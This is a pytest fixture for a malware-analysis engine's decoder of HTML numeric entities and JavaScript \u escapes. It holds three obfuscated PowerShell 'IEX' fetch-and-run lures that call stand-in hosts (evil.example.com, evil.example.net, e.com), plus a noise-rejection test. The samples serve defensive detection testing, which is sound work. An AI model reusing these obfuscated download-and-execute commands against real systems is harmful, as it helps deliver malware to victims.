"""Golden regression fixture — html-unicode-escape decoder (RC3.1 · Phase C.5).

Locks the two obfuscation primitives introduced in RC3.1:

  1. HTML numeric entities (`&#112;…`) — canonical phishing lure obfuscator.
  2. JS / JSON `\\uXXXX` Unicode escapes — canonical JS-dropper obfuscator.

Every entry asserts:
  * detector fires (chain includes 'html-unicode-escape')
  * downstream IOC extractor recovers the embedded URL
  * verdict is ≥ suspicious (deterministic scoring pathway remains intact)
"""
from __future__ import annotations

import pytest

from engine import AnalysisContext, Budget, Orchestrator
import decoders  # noqa: F401 — plugin auto-discovery side-effect


# Canonical payloads used by phishing/JS-dropper corpora
_HTML_ENTITY_PS = (
    "&#112;&#111;&#119;&#101;&#114;&#115;&#104;&#101;&#108;&#108;&#32;&#45;"
    "&#101;&#110;&#99;&#32;&#73;&#69;&#88;&#40;&#39;&#104;&#116;&#116;&#112;"
    "&#58;&#47;&#47;&#101;&#118;&#105;&#108;&#46;&#101;&#120;&#97;&#109;&#112;"
    "&#108;&#101;&#46;&#99;&#111;&#109;&#47;&#120;&#39;&#41;"
)
_HTML_ENTITY_HEX_PS = (
    "&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x20;"
    "IEX('http://evil.example.net/y')"
)
_JS_UNI_EVAL = (
    r"eval(\"\u0070\u006f\u0077\u0065\u0072\u0073\u0068\u0065\u006c\u006c "
    r"\u002d\u0065\u006e\u0063 \u0068\u0074\u0074\u0070\u003a\u002f\u002f"
    r"\u0065\u002e\u0063\u006f\u006d\u002f\u0078\")"
)


@pytest.mark.parametrize("sample,expected_url", [
    (_HTML_ENTITY_PS,     "http://evil.example.com/x"),
    (_HTML_ENTITY_HEX_PS, "http://evil.example.net/y"),
    (_JS_UNI_EVAL,        "http://e.com/x"),
])
def test_html_unicode_escape_recovers_url(sample: str, expected_url: str) -> None:
    ctx = AnalysisContext(budget=Budget(wall_time_ms=8000))
    r = Orchestrator(ctx).run(sample)

    chain = [t.decoder for t in r.trace]
    assert "html-unicode-escape" in chain, f"decoder missing from chain: {chain}"
    assert expected_url in r.findings.iocs.urls, (
        f"URL {expected_url!r} not recovered — got {list(r.findings.iocs.urls)}"
    )
    assert r.findings.verdict in ("suspicious", "malicious"), (
        f"verdict {r.findings.verdict!r} — expected suspicious/malicious"
    )
    # Tradecraft flag surfaced
    flags = {tc.flag for tc in r.findings.tradecraft}
    assert "html-unicode-escape" in flags, f"tradecraft flags: {flags}"


def test_html_unicode_escape_refuses_sparse_noise() -> None:
    """Sparse `\\u0000` sequences inside a long binary blob must NOT trigger
    a phantom decode — density gate keeps precision-first behaviour."""
    noise = "A" * 200 + r"\u0041 some prose that mostly is not obfuscated"
    ctx = AnalysisContext(budget=Budget(wall_time_ms=8000))
    r = Orchestrator(ctx).run(noise)
    chain = [t.decoder for t in r.trace]
    assert "html-unicode-escape" not in chain, (
        f"detector should have skipped sparse noise; chain={chain}"
    )
